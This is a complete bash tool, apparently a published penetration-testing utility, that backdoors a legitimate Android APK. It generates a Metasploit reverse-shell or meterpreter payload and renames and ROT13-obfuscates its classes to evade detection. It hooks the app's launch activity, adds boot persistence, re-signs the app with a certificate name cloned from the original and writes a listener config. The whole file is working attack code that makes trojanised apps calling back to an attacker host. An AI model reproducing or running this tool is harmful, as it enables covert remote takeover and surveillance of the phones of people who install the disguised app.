#!/bin/bash

# file: backdoor-apk.sh

# version: 0.1.5

# usage: ./backdoor-apk.sh original.apk

# Dana James Traversie
# Security Engineer
# Check Point Software Technologies, Ltd.

# IMPORTANT: The following packages were required on Kali Linux in order to get things rolling. These packages are likely required by other Linux distros as well.
# apt-get install lib32z1 lib32ncurses5 lib32stdc++6


PAYLOAD=""
LHOST=""
LPORT=""

MSFVENOM=msfvenom
DEX2JAR=d2j-dex2jar
UNZIP=unzip
KEYTOOL=keytool
JARSIGNER=jarsigner
APKTOOL=apktool
PROGUARD=third-party/proguard5.2.1/lib/proguard
DX=third-party/android-sdk-linux/build-tools/23.0.3/dx
ZIPALIGN=third-party/android-sdk-linux/build-tools/23.0.3/zipalign
# file paths and misc
MY_PATH=`pwd`
ORIG_APK_FILE=$1
RAT_APK_FILE=Rat.apk
LOG_FILE=$MY_PATH/run.log
TIME_OF_RUN=`date`


# colors for messages
green="\033[32m"
blue="\033[34m"
red="\033[0;31m"
yellow="\033[33m"
normal="\033[0m"

# functions
function exception_handler {
  if [ $1 != 0 ]; then
    echo -e "$red $2 $normal"
    cleanup
    exit $1
  fi
}


function cleanup {
  echo "Forcing cleanup due to a failure or error state!" >>$LOG_FILE 2>&1
  bash cleanup.sh >>$LOG_FILE 2>&1
}

function verify_orig_apk {
  if [ -z $ORIG_APK_FILE ]; then
    echo -e "$red[!] No original APK file specified $normal"
    exit 1
  fi

  if [ ! -f $ORIG_APK_FILE ]; then
    echo -e "$red[!] Original APK file specified does not exist$normal"
    exit 1
  fi

  $UNZIP -l $ORIG_APK_FILE >>$LOG_FILE 2>&1
  rc=$?
  exception_handler $rc "[!] Original APK file specified is not valid"

}

function consult_which {
  which $1 >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    echo -e "$red[!] Check your environment and configuration. Couldn't find: $1$normal"
    exit $rc
  fi
}

function print_ascii_art {
echo -e "$yellow"
cat << "EOF"
          ________
         / ______ \
         || _  _ ||
         ||| || |||          AAAAAA      PPPPPPP    KKK  KKK
         |||_||_|||         AAA  AAA     PPP  PPP   KKK KKK
         || _  _o|| (o)    AAAA  AAAA    PPP  PPPP  KKKKKK
         ||| || |||       AAAAAAAAAAAA   PPPPPPPP   KKK KKK
         |||_||_|||      AAAA      AAAA  PPPP       KKK  KKK
         ||______||     AAAA        AAAA PPPP       KKK  KKKK
        /__________\
________|__________|__________________________________________
       /____________\
       |____________|             Dana James Traversie

EOF
echo -e $normal
}

function get_payload {
  echo -e  "$blue[+] Android payload options:$normal"
  PS3="[?] Please select an Android payload option:"
  echo -e "$yellow"
  options=("meterpreter/reverse_http" "meterpreter/reverse_https" "meterpreter/reverse_tcp" "shell/reverse_http" "shell/reverse_https" "shell/reverse_tcp")
  select opt in "${options[@]}"
  do
    case $opt in
      "meterpreter/reverse_http")
        PAYLOAD="android/meterpreter/reverse_http"
        break
        ;;
      "meterpreter/reverse_https")
        PAYLOAD="android/meterpreter/reverse_https"
        break
        ;;
      "meterpreter/reverse_tcp")
        PAYLOAD="android/meterpreter/reverse_tcp"
        break
        ;;
      "shell/reverse_http")
        PAYLOAD="android/shell/reverse_http"
        break
        ;;
      "shell/reverse_https")
        PAYLOAD="android/shell/reverse_https"
        break
        ;;
      "shell/reverse_tcp")
        PAYLOAD="android/shell/reverse_tcp"
        break
        ;;
      *)
        echo -e "$red[!] Invalid option selected$normal"
        ;;
    esac
  done
echo -e "$normal"
}

function get_lhost {
  while true; do
    read -p "[?] Please enter an LHOST value: " lh
    if [ $lh ]; then
      LHOST=$lh
      break
    fi
  done
}

function get_lport {
  while true; do
    read -p "[?] Please enter an LPORT value: " lp
    if [ $lp ]; then
      if [[ "$lp" =~ ^[0-9]+$ ]] && [ "$lp" -ge 1 -a "$lp" -le 65535 ]; then
        LPORT=$lp
        break
      fi
    fi
  done
}

function init {
  echo "Running backdoor-apk at $TIME_OF_RUN" >$LOG_FILE 2>&1
  print_ascii_art
  echo -e "$green[*] Running backdoor-apk.sh v0.1.5 on $TIME_OF_RUN $normal"
  consult_which $MSFVENOM
  consult_which $DEX2JAR
  consult_which $UNZIP
  consult_which $KEYTOOL
  consult_which $JARSIGNER
  consult_which $APKTOOL
  consult_which $PROGUARD
  consult_which $DX
  consult_which $ZIPALIGN
  verify_orig_apk
  get_payload
  get_lhost
  get_lport
}


function checkLibs {
if [ $(dpkg-query -W -f='${Status}' $1 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
  apt-get install "$1";
else
  echo -e "$blue $1 installed $normal"
fi
}

# kick things off
init

echo -e "$red++++++++ Checking for required Libraries ++++++++$normal"
checkLibs lib32z1
checkLibs lib32ncurses5
checkLibs lib32stdc++6
echo

echo -ne "$green[*] Generating RAT APK file...$normal"
$MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to generate RAT APK file"

echo -e "$blue   [+] Using payload: $PAYLOAD $normal"
echo -e "$blue   [+] Handle the reverse connection at: $LHOST:$LPORT $normal"

echo -ne "$green[*] Decompiling RAT APK file...$normal"
$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to decompile RAT APK file"

echo -ne "$green[*] Decompiling original APK file... $normal"
$APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to decompile original APK file"

echo -ne "$green[*] Merging permissions of original and payload projects... $normal"
# build random hex placeholder value without openssl
placeholder=''
for i in `seq 1 4`; do
  rand_num=`shuf -i 1-2147483647 -n 1`
  hex=`printf '%x' $rand_num`
  placeholder="$placeholder$hex"
done
echo "placeholder value: $placeholder" >>$LOG_FILE 2>&1
tmp_perms_file=$MY_PATH/perms.tmp
original_manifest_file=$MY_PATH/original/AndroidManifest.xml
payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
grep "<uses-permission" $original_manifest_file >$tmp_perms_file
grep "<uses-permission" $payload_manifest_file >>$tmp_perms_file
grep "<uses-permission" $tmp_perms_file|sort|uniq >$tmp_perms_file.uniq
mv $tmp_perms_file.uniq $tmp_perms_file
sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file >$merged_manifest_file
cat $merged_manifest_file|uniq > $merged_manifest_file.uniq
mv $merged_manifest_file.uniq $merged_manifest_file
sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
mv $merged_manifest_file $original_manifest_file
echo -e "$blue Done! $normal"

# cleanup payload directory after merging app permissions
rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1

# use dex2jar, proguard, and dx
# to shrink, optimize, and obfuscate original Rat.apk code
echo -ne "$green[*] Running proguard on RAT APK file... $normal"
mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
mkdir -v -p $MY_PATH/libs >>$LOG_FILE 2>&1
mv $MY_PATH/$RAT_APK_FILE $MY_PATH/bin/classes >>$LOG_FILE 2>&1
$DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
rc=$?
exception_handler $rc "[!] Failed to run dex2jar on RAT APK file"

# inject Java classes
cp -R $MY_PATH/java/classes/* $MY_PATH/libs/ >>$LOG_FILE 2>&1
rc=$?
exception_handler $rc "[!] Failed to inject Java classes"

cd $MY_PATH/bin/classes && jar xvf Rat-dex2jar.jar >>$LOG_FILE 2>&1
cd $MY_PATH
rm $MY_PATH/bin/classes/*.apk $MY_PATH/bin/classes/*.jar >>$LOG_FILE 2>&1
$PROGUARD @android.pro >>$LOG_FILE 2>&1
rc=$?
exception_handler $rc "[!] Failed to run proguard with specified configuration"

$DX --dex --output="$MY_PATH/$RAT_APK_FILE" $MY_PATH/bin/classes-processed.jar >>$LOG_FILE 2>&1
rc=$?
exception_handler $rc "[!] Failed to run dx on proguard processed jar file"
echo -e "$blue Done! $normal"

echo -ne "$green[*] Decompiling obfuscated RAT APK file..."
$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to decompile RAT APK file"


# avoid having com/metasploit/stage path to smali files
tldlist_max_line=`wc -l $MY_PATH/lists/tldlist.txt |awk '{ print $1 }'`
tldlist_rand_line=`shuf -i 1-${tldlist_max_line} -n 1`
namelist_max_line=`wc -l $MY_PATH/lists/namelist.txt |awk '{ print $1 }'`
namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
payload_tld=`sed "${tldlist_rand_line}q;d" $MY_PATH/lists/tldlist.txt`
echo "payload_tld is: $payload_tld" >>$LOG_FILE 2>&1
payload_primary_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
echo "payload_primary_dir is: $payload_primary_dir" >>$LOG_FILE 2>&1
namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
payload_sub_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
echo "payload_sub_dir is: $payload_sub_dir" >>$LOG_FILE 2>&1

echo -ne "$green[*] Creating new directories in original project for RAT smali files...$normal"
mkdir -v -p $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to create new directories for RAT smali files"

echo -ne "$green[*] Copying RAT smali files to new directories in original project...$normal"
cp -v $MY_PATH/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  cp -v $MY_PATH/payload/smali/net/dirtybox/util/{a.smali,b.smali,c.smali,d.smali} $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
  rc=$?
fi
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to copy RAT smali files"


echo -ne "$green[*] Fixing RAT smali files...$normal"
sed -i 's/MainBroadcastReceiver/AppBoot/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  sed -i 's|com\([./]\)metasploit\([./]\)stage|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali,d.smali,AppBoot.smali} >>$LOG_FILE 2>&1
  rc=$?
fi
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to fix RAT smali files"


echo -ne "$green[*] Obfuscating const-string values in RAT smali files...$normal"
cat >$MY_PATH/obfuscate.method <<EOL

    invoke-static {###REG###}, L###CLASS###;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object ###REG###
EOL
sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  grep "const-string" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} |while read -r line; do
    file=`echo $line |awk -F ": " '{ print $1 }'`
    echo "File: $file" >>$LOG_FILE 2>&1
    target=`echo $line |awk -F ", " '{ print $2 }'`
    echo "Target: $target" >>$LOG_FILE 2>&1
    tmp=`echo $line |awk -F ": " '{ print $2 }'`
    reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
    echo "Reg: $reg" >>$LOG_FILE 2>&1
    replacement=`echo $target |tr '[A-Za-z]' '[N-ZA-Mn-za-m]'`
    echo "Replacement: $replacement" >>$LOG_FILE 2>&1
    sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      touch $MY_PATH/obfuscate.error
      break
    fi
    sed -i '\|'"$replacement"'|r '"$MY_PATH"'/obfuscate.method' $file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      touch $MY_PATH/obfuscate.error
      break
    fi
    sed -i 's/###REG###/'"$reg"'/' $file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      touch $MY_PATH/obfuscate.error
      break
    fi
  done
  if [ ! -f $MY_PATH/obfuscate.error ]; then
    class="$payload_tld/$payload_primary_dir/$payload_sub_dir/d"
    sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali}
    rc=$?
  else
    rm -v $MY_PATH/obfuscate.error >>$LOG_FILE 2>&1
    rc=1
  fi
fi
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to obfuscate const-string values in RAT smali files"


echo -ne "$green[*] Locating smali file to hook in original project...$normal"
total_package=`head -n 2 $MY_PATH/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |awk -F ":" '{ print $1 }'`
echo "Found launcher line in manifest file: $launcher_line_num" >>$LOG_FILE 2>&1
activity_line_count=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |grep -c "<activity"`
echo "Activity lines found above launcher line: $activity_line_count" >>$LOG_FILE 2>&1
# should get a value here if launcher line is within an activity-alias element
android_target_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:targetActivity="[^\"]+"'|sed 's/\"//g'|sed 's/android:targetActivity=//g'|sed 's/\./\//g'`
echo "Value of android_target_activity: $android_target_activity" >>$LOG_FILE 2>&1
android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
echo "Value of android_name: $android_name" >>$LOG_FILE 2>&1
if [ -z $android_target_activity ]; then
  echo "The launcher line appears to be within an activity element" >>$LOG_FILE 2>&1
  tmp=$android_name
else
  echo "The launcher line appears to be within an activity-alias element" >>$LOG_FILE 2>&1
  tmp=$android_target_activity
fi
echo "Value of tmp: $tmp" >>$LOG_FILE 2>&1
smali_file_to_hook=$MY_PATH/original/smali/$tmp.smali
if [ ! -f $smali_file_to_hook ]; then
  smali_file_to_hook=$MY_PATH/original/smali/$total_package$tmp.smali
fi
echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to locate smali file to hook"


echo -ne "$green[*] Adding hook in original smali file...$normal"
sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$payload_tld"'\/'"$payload_primary_dir"'\/'"$payload_sub_dir"'\/a;->a(Landroid\/content\/Context;)V' $smali_file_to_hook >>$LOG_FILE 2>&1
grep -B 2 "$payload_tld/$payload_primary_dir/$payload_sub_dir/a" $smali_file_to_hook >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to add hook"


echo -ne "$green[*] Adding persistence hook in original project...$normal"
cat >$MY_PATH/persistence.hook <<EOL
        <receiver android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.AppBoot">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
EOL
sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  sed -i '/'"$placeholder"'/r '"$MY_PATH"'/persistence.hook' $original_manifest_file >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc == 0 ]; then
    sed -i '/'"$placeholder"'/d' $original_manifest_file >>$LOG_FILE 2>&1
    rc=$?
  fi
fi
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to add persistence hook"


echo -ne "$green[*] Recompiling original project with backdoor...$normal"
$APKTOOL b $MY_PATH/original >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to recompile original project with backdoor"

keystore=$MY_PATH/signing.keystore
compiled_apk=$MY_PATH/original/dist/$ORIG_APK_FILE
unaligned_apk=$MY_PATH/original/dist/unaligned.apk

orig_rsa_cert=`$UNZIP -l $ORIG_APK_FILE |grep ".RSA" |awk ' { print $4 } '`
dname=`$UNZIP -p $ORIG_APK_FILE $orig_rsa_cert |$KEYTOOL -printcert |head -n 1 |sed 's/^.*: CN=/CN=/g'`
echo "dname value: $dname" >>$LOG_FILE 2>&1

echo -ne "$green[*] Generating RSA key for signing...$normal"
$KEYTOOL -genkey -noprompt -alias signing.key -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 -validity 10000 >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to generate RSA key"

echo -ne "$green[*] Signing recompiled APK...$normal"
$JARSIGNER -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apk signing.key >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to sign recompiled APK"

echo -ne "$green[*] Verifying signed artifacts...$normal"
$JARSIGNER -verify -certs $compiled_apk >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to verify signed artifacts"


mv $compiled_apk $unaligned_apk

echo -ne "$green[*] Aligning recompiled APK...$normal"
$ZIPALIGN 4 $unaligned_apk $compiled_apk >>$LOG_FILE 2>&1
rc=$?
echo -e "$blue Done! $normal"
exception_handler $rc "[!] Failed to align recompiled APK"

rm $unaligned_apk

## Generate Metasploit RC file (msfconsole -r backdoorApk.rc).
echo -ne "$green[*] Generating Metasploit rc file..$normal"
echo "use exploit/multi/handler" > backdoorApk.rc
echo "load sounds" >> backdoorApk.rc
echo "set payload $PAYLOAD" >> backdoorApk.rc
echo "set LHOST $LHOST" >> backdoorApk.rc
echo "set LPORT $LPORT" >> backdoorApk.rc
echo "set setg EnableStageEncoding true" >> backdoorApk.rc
echo "set TimestampOutput true" >> backdoorApk.rc
echo "set ExitOnSession false" >> backdoorApk.rc
echo "set VERBOSE true" >> backdoorApk.rc
echo "exploit -j" >> backdoorApk.rc
rc=$?
echo -e "$blue Done! $normal"

exception_handler $rc "[!] Failed to align recompiled APK"
echo

echo -e "$yellow To start the handler run : $normal $green msfconsole -r backdoorApk.rc $normal"

exit 0
